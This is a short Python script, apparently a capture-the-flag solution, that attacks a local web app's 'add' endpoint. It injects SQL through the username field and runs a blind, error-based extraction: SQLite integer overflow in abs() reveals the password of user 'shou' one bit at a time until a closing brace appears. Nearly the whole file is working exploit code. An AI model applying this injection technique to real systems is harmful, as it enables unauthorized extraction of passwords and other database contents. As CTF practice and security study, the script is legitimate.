import requests

HOST = 'http://127.0.0.1:4008/'

def query(payload):
  r = requests.post(HOST + 'add', data={
    'username': payload,
    'password': ''
  })
  return 'integer overflow' in r.text

i = 1
res = ''
while True:
  c = 0
  for j in range(7):
    r = query(f"'),('',abs(-9223372036854775807 - case when unicode(substr((select group_concat(password) from user where username = 'shou'), {i}, 1)) & {1 << j} then 1 else 0 end)) -- ")
    if r:
      c |= 1 << j
  res += chr(c)
  print(i, res)
  if res[-1] == "}":
      break
  i += 1